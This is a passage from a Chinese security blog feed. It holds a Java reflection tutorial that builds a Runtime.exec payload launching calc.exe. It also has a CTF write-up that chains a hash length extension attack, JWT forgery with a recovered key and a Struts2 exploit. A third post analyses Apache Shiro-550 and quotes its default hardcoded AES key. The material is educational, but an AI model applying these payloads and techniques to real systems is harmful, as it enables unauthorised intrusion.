<p>写个代码举个例子，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PrivateInstance</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         Class&lt;?&gt; cls = Class.forName(<span class="string">&quot;reflect2.TrainDB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样只有在初始化时才会执行一次静态变量，实例化<code>TrainDB</code>类，并执行构造函数，而后只能通过调用<code>getInstance()</code> ，才可以获得其实例，但是不会执行构造函数，这样也避免了多次建立实例。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907172109455.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907172109455.png" alt="image-20230907172109455"></a></p>
<h2 id="paload构造"><a href="#paload构造" class="headerlink" title="paload构造"></a>paload构造</h2><p>回归正题，<code>Runtime</code>也是一样的，它也是单例模式，只能通过<code>Runtime.getRuntime()</code>获取<code>Runtime</code>的实例</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230907173650476.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230907173650476.png" alt="image-20230907173650476"></a></p>
<p>那么要构造<code>payload</code>就需要改一下，就不能用<code>newIntstrance</code>进行对<code>Runtime</code>的实例化，只有通过<code>Runtime.getRuntime</code>这个设定的静态方法获取<code>Runtime</code>的实例化后的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect2;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InstanceRuntime</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>,String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>发现用了<code>getMethod</code>方法和<code>invoke</code>方法，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230909110419443.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230909110419443.png" alt="image-20230909110419443"></a></p>
<h2 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h2><p><code>getMethod</code>的作用就算通过反射获得一个类的某个特定的公有方法。其需要两个参数，第一个是方法名，第二个是方法所需参数的类型  [ 比如，字符串就算<code>String.class</code>] 。</p>
<p>但是在Java中支持类的重载，也就是可能存在多个<code>相同的名字</code>的但是参数列表或者类型不同的方法，所以只知道名字并不能直接确认函数。</p>
<p>所以在这里想调用<code>exec</code>方法时，就需要看看在<code>Runtime</code>中其重载列表，看看目标方法中所需的参数类型及其列表。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230909105451350.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230909105451350.png" alt="image-20230909105451350"></a></p>
<p>这里可以用第四个重载类型，只要一个字符串，最简单。而前三个要字符串数组，也就是一个命令加上参数之类的。</p>
<p>所以就得到了通过以下代码获取<code>Runtime.exec</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br></pre></td></tr></table></figure>

<p><code>getMethod</code>获得这个方法后，就需要执行这个方法，比如传入参数等等。</p>
<h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p><code>invoke</code>的作用就是执行方法，它的第一个参数是：</p>
<ul>
<li><p>如果这个方法是一个普通的方法，那么第一个参数就是类对象</p>
</li>
<li><p>如果这个方法是一个静态的方法，那么第一个参数是类</p>
<blockquote>
<p>原因是普通方法需要类实例化后得到类对象，才可以调用该普通方法，所以需要传入类对象。</p>
<p>而静态方法不用实例化类，就可以直接调用，所以传入类名即可。</p>
</blockquote>
</li>
</ul>
<p>其实转化一下就更加清楚了，</p>
<p>正常调用一个方法是 <code>[1].method([2], [3], [4]...)</code> ，而在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code> 。其中<code>[1]</code>是类或者类对象，而后<code>[...]</code>就是传入方法的参数。</p>
<h2 id="paload分析"><a href="#paload分析" class="headerlink" title="paload分析"></a>paload分析</h2><p>按上述的，分解一下<code>payload</code>，</p>
<p>这里先初始化<code>Runtime</code>类，</p>
<p>然后获取<code>Runtime</code>的<code>exec</code>方法，</p>
<p>然后再获取<code>Runtime</code>的<code>getRuntime</code>方法，</p>
<p>然后执行<code>getRuntime</code>获取<code>Runtime</code>的实例化对象，这里<code>invoke</code>传入任何都可以，因为这里<code>getRuntime</code>方法是无参方法，所以不需要参数也行。</p>
<p>最后调用，<code>exec</code>方法，<code>invoke</code>第一个传入<code>Runtime</code>的实例化对象，第二传入执行的命令<code>calc</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(clazz);</span><br><span class="line">((Method) execMethod).invoke(runtime, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%B0%84(2)%5D/image-20230909113747032.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%B0%84(2)]/image-20230909113747032.png" alt="image-20230909113747032"></a></p>
<p>最后两个疑问，</p>
<blockquote>
<ul>
<li>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</li>
<li>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2023(星)CTF</title>
    <url>/2023(%E6%98%9F)CTF/</url>
    <content><![CDATA[<p><code>咋只有一道web，全是ai题</code></p>
<span id="more"></span>

<h1 id="jwt2struts"><a href="#jwt2struts" class="headerlink" title="jwt2struts"></a>jwt2struts</h1><p>看题目猜测考点是<code>jwt伪造+s2漏洞</code></p>
<p>进入网站，发现是需要admin身份，也确实是jwt伪造</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230731095441281.png"><img src="/2023(%E6%98%9F)CTF/image-20230731095441281.png" alt="image-20230731095441281"></a></p>
<h2 id="解析jwt"><a href="#解析jwt" class="headerlink" title="解析jwt"></a>解析jwt</h2><p>用<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a>进行解析，发现确实是jwt</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230731142627322.png"><img src="/2023(%E6%98%9F)CTF/image-20230731142627322.png" alt="image-20230731142627322"></a></p>
<p>但是不知道密钥，</p>
<p>先尝试是不是空密钥，直接修改为admin</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230731155151954.png"><img src="/2023(%E6%98%9F)CTF/image-20230731155151954.png" alt="image-20230731155151954"></a></p>
<p>得到新的<code>jwt</code></p>
<blockquote>
<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjM5MzI5N30.L0YCThgRESeqIu8mUgr_IjD6CYadVNFH4sQ29w40nnU</p>
</blockquote>
<p>代入再次访问网站</p>
<p>结果提示<code>token</code>无效，</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230731155331700.png"><img src="/2023(%E6%98%9F)CTF/image-20230731155331700.png" alt="image-20230731155331700"></a></p>
<p>查看网页源码发现</p>
<p>提示<code>JWT_key.php</code></p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230731155922977.png"><img src="/2023(%E6%98%9F)CTF/image-20230731155922977.png" alt="image-20230731155922977"></a></p>
<p>这应该就是jwt生成和身份验证的php代码</p>
<p>访问得到代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./secret_key.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./salt.php&quot;</span>;</span><br><span class="line"><span class="comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span></span><br><span class="line"><span class="comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span></span><br><span class="line">@<span class="variable">$username</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">@<span class="variable">$password</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">no no no</span><br></pre></td></tr></table></figure>

<h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>发现想要得到key，关键在于这段条件语句的绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$password</span> != <span class="string">&quot;root&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;digest&quot;</span>] === <span class="title function_ invoke__">md5</span>(<span class="variable">$salt</span>.<span class="variable">$username</span>.<span class="variable">$password</span>)) &#123;</span><br><span class="line">           <span class="keyword">die</span> (<span class="string">&quot;The secret_key is &quot;</span>. <span class="variable">$secret_key</span>);</span><br></pre></td></tr></table></figure>

<p><code>$username</code>和<code>$password</code>好实现</p>
<blockquote>
<p><code>username</code>:<code>admin</code>，<code>password</code>:除了<code>root</code>以为的字符</p>
</blockquote>
<blockquote>
<p><code>$_COOKIE[&quot;digest&quot;]</code>要求为<code>md5($salt.$username.$password)</code></p>
</blockquote>
<p>也就是<code>$_COOKIE[&quot;digest&quot;]</code>要为<code>盐+名字+密码</code>的字符串的md5值</p>
<p>现在知道，</p>
<blockquote>
<p>盐的长度是<code>14</code>，</p>
<p>且<code>md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</code></p>
</blockquote>
<h2 id="hash长度拓展攻击"><a href="#hash长度拓展攻击" class="headerlink" title="hash长度拓展攻击"></a>hash长度拓展攻击</h2><p>对于这种未知salt，但又要进行绕过MD5或者sha1加密的，就可以考虑用<code>hash长度拓展攻击</code></p>
<p><a href="https://j-kangel.github.io/2019/04/05/hash-attack/">hash长度扩展攻击 | KANGEL (j-kangel.github.io)</a></p>
<p>【个人分析写在笔记上】</p>
<p>利用工具<code>hashdump</code></p>
<figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Input</span> Signature                    <span class="meta">#现有哈希值（题目给的MD5）</span></span><br><span class="line"><span class="keyword">Input</span> Data                         <span class="meta">#已知字符串</span></span><br><span class="line"><span class="keyword">Input</span> Key <span class="keyword">Length</span>                   <span class="meta">#为密文（salt）长度</span></span><br><span class="line"><span class="keyword">Input</span> Data to Add                  <span class="meta">#为补位后自己加的字符串（自定义）</span></span><br></pre></td></tr></table></figure>



<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801211703847.png"><img src="/2023(%E6%98%9F)CTF/image-20230801211703847.png" alt="image-20230801211703847"></a></p>
<blockquote>
<p>Input Signature: e6ccbf12de9d33ec27a5bcfb6a3293df<br>Input Data: adminroot<br>Input Key Length: 14<br>Input Data to Add: Jay<br>8ae52974e81aace9837123a520cb8179<br>adminroot\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00Jay</p>
</blockquote>
<p>然后把<code>\x</code>换成<code>%</code></p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801211736595.png"><img src="/2023(%E6%98%9F)CTF/image-20230801211736595.png" alt="image-20230801211736595"></a></p>
<p>此时，</p>
<blockquote>
<p><code>$_COOKIE[&quot;digest&quot;]</code></p>
<p>就为<code>Cookie: digest=8ae52974e81aace9837123a520cb8179</code></p>
</blockquote>
<blockquote>
<p><code>$username</code>和<code>$password</code></p>
<p>就为<code>admin</code>和<code>root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00Jay</code></p>
</blockquote>
<p>然后修改请求包内容</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801212115216.png"><img src="/2023(%E6%98%9F)CTF/image-20230801212115216.png" alt="image-20230801212115216"></a></p>
<p>得到<code>sercret_key</code>为<code>sk-he00lctf3r</code></p>
<p>然后修改jwt，进行jwt伪造</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801215103147.png"><img src="/2023(%E6%98%9F)CTF/image-20230801215103147.png" alt="image-20230801215103147"></a></p>
<p>然后修改网站的<code>token</code></p>
<p>刷新后，网站跳转<code>http://140.210.223.216:55557/admiiiiiiiiiiin/</code>，</p>
<p>网站的名字就叫<code>do you know struct2?</code></p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801215237349.png"><img src="/2023(%E6%98%9F)CTF/image-20230801215237349.png" alt="image-20230801215237349"></a></p>
<p>确定这里是需要利用<code>s2</code>漏洞</p>
<p>抓包查看这个网页提交请求包</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801215510347.png"><img src="/2023(%E6%98%9F)CTF/image-20230801215510347.png" alt="image-20230801215510347"></a></p>
<p>发现是发向<code>/admiiiiiiiiiiin/user.action</code></p>
<p>直接用工具也可以</p>
<p>flag在环境变量里，执行<code>env</code>可以看到</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801215357776.png"><img src="/2023(%E6%98%9F)CTF/image-20230801215357776.png" alt="image-20230801215357776"></a></p>
<p>burp发包也可以，只是需要将<code>s2</code>的payload进行url编码即可</p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230801215658845.png"><img src="/2023(%E6%98%9F)CTF/image-20230801215658845.png" alt="image-20230801215658845"></a></p>
<hr>
<h2 id="ps-jwt-cracker【非预期无法解】"><a href="#ps-jwt-cracker【非预期无法解】" class="headerlink" title="ps.jwt-cracker【非预期无法解】"></a>ps.jwt-cracker【非预期无法解】</h2><p>本来是想用<code>jwt-cracker</code>进行爆破<code>jwt</code>的<code>secret</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull epsilon95/jwtcrack</span><br><span class="line"></span><br><span class="line">docker run -it --<span class="built_in">rm</span> jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIiwiZXhwIjoyMDA2MzkzMjk3fQ.bQxqRhEOZkHV3NweYcdVKO_0WKrSDIb4ExcB-9UZRk0</span><br></pre></td></tr></table></figure>

<p>结果CPU跑飞了也没爆破出来，看来是不是非预期能解出来，只能考虑<code>hash长度拓展攻击</code></p>
<p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230731171850197.png"><img src="/2023(%E6%98%9F)CTF/image-20230731171850197.png" alt="image-20230731171850197"></a></p>
<h2 id="脚本利用rockyou爆破salt【不知道是不是预期可行】"><a href="#脚本利用rockyou爆破salt【不知道是不是预期可行】" class="headerlink" title="脚本利用rockyou爆破salt【不知道是不是预期可行】"></a>脚本利用rockyou爆破salt【不知道是不是预期可行】</h2><p><a data-fancybox="gallery" data-src="/2023(%E6%98%9F)CTF/image-20230905090421230.png"><img src="/2023(%E6%98%9F)CTF/image-20230905090421230.png" alt="image-20230905090421230"></a></p>
<p>在<code>rockyou.txt</code>中有这个key，说明可以利用这个方法进行爆破，写个脚本即可进行</p>
<p>过滤rockyou中长度为14的字符，然后加到</p>
<p>adminroot前进行MD5计算使得计算后的值为</p>
<p><code>e6ccbf12de9d33ec27a5bcfb6a3293df</code></p>
<p>&#x3D;&gt;</p>
<p>最后我们就可以爆破出salt为<code>sk-he00lctf3r</code></p>
<p>最后只要密码随便修改为<code>root1</code>即可，然后再MD5计算一次得到<code>cookie</code>值</p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>Game</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache shiro-550反序列化漏洞分析</title>
    <url>/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p><code>很重要，经典</code></p>
<span id="more"></span>

<h1 id="Apache-shiro-550反序列化漏洞分析"><a href="#Apache-shiro-550反序列化漏洞分析" class="headerlink" title="Apache shiro-550反序列化漏洞分析"></a>Apache shiro-550反序列化漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>中间件介绍：</p>
<blockquote>
<p>Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理</p>
</blockquote>
<p>漏洞介绍：</p>
<blockquote>
<p>ApacheShiro RememberMe 反序列化导致的命令执行漏洞</p>
</blockquote>
</blockquote>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>编辑器：<code>IDEA 2022</code></p>
<p>java版本：<code>jdk1.7.0_80</code></p>
<p>Server版本 : <code>Tomcat 8.5.56</code></p>
<p>shiro版本：<code>shiro-root-1.2.4</code></p>
<p>组件：<code>commons-collections4</code></p>
</blockquote>
<p>下载<code>jdk-7u80</code></p>
<blockquote>
<p><a href="https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR">https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html#jdk-7u80-oth-JPR</a></p>
</blockquote>
<p>下载<code>apache shiro 1.2.4</code></p>
<blockquote>
<p><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a></p>
</blockquote>
<p>下载<code>tomcat-8 v8.5.76</code></p>
<blockquote>
<p><a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.76/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.76/</a></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722144653168.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722144653168.png" alt="image-20230722144653168"></a></p>
<p>配置调试端口</p>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722144930349.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722144930349.png" alt="image-20230722144930349"></a></p>
<p>但是运行时报错</p>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722230806143.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722230806143.png" alt="image-20230722230806143"></a></p>
<p>搜索查找发现是少了两个<code>jar</code>包</p>
<p>【直接官网找或者搜索网盘啥的，小心🐎就行】</p>
<blockquote>
<p><code>jstl.jar</code> </p>
<p><code>standard.jar</code></p>
</blockquote>
<p>先将这两个导入依赖</p>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722231157385.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722231157385.png" alt="image-20230722231157385"></a></p>
<p>然后放在<code>tomcat</code>服务器文件目录底下的<code>lib</code>目录下</p>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722232037189.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722232037189.png" alt="image-20230722232037189"></a></p>
<p>成功加载 </p>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722232130625.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722232130625.png" alt="image-20230722232130625"></a></p>
<p>登录页面也成功显示</p>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722233339743.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230722233339743.png" alt="image-20230722233339743"></a></p>
<p>搭建完毕!</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote>
<p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过<code>序列化</code>，<code>AES加密</code>，然后<code>base64编码</code>的cookie。</p>
<p>在服务端对 rememberMe 的cookie值，先<code>base64解码</code>然后<code>AES解密</code>再<code>反序列化</code>，就导致了反序列化RCE漏洞。 </p>
<p>那么，Payload产生的过程：</p>
<p><code>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</code> </p>
<p>在整个漏洞利用过程中，比较重要的是<code>AES加密的密钥</code>，如果没有修改默认的密钥那么就很容易就知道密钥了，Payload构造起来也是十分</p>
<p>的简单。</p>
</blockquote>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote>
<ul>
<li>过在 cookie 的 rememberMe 字段中插⼊恶意 payload </li>
<li>触发 shiro 框架的 rememberMe 的反序列化功能，导致任意代码执⾏。 </li>
<li>shiro 1.2.24 中，提供了硬编码的 AES 密钥： <code>kPH+bIxk5D2deZiIxcaaaA==</code> </li>
<li>由于**<u>开发人员未修改AES密钥而直接使用Shiro框架</u>**，导致了该问题</li>
</ul>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230726093857880.png"><img src="/Apache_shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230726093857880.png" alt="image-20230726093857880"></a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>







<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h2 id="漏洞利用-poc分析"><a href="#漏洞利用-poc分析" class="headerlink" title="漏洞利用&amp;poc分析"></a>漏洞利用&amp;poc分析</h2>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2023CISCN华南</title>
    <url>/2023CISCN%E5%8D%8E%E5%8D%97/</url>
    <content><![CDATA[<p><code>2023国赛华南赛区题目学习</code></p>
<span id="more"></span>

<h1 id="OwnSquirrelly"><a href="#OwnSquirrelly" class="headerlink" title="OwnSquirrelly"></a>OwnSquirrelly</h1><blockquote>
<p><a href="https://github.com/squirrellyjs/squirrelly">Squirrelly</a> 是一个用 JavaScript 实现的现代、可配置且速度极快的模板引擎。它与 ExpressJS 一起开箱即用，完整版的 gzip 压缩后仅重约 4KB。</p>
</blockquote>
<p><code>app.js</code>，发现题目是nodejs编写的网站服务，端口3000</p>
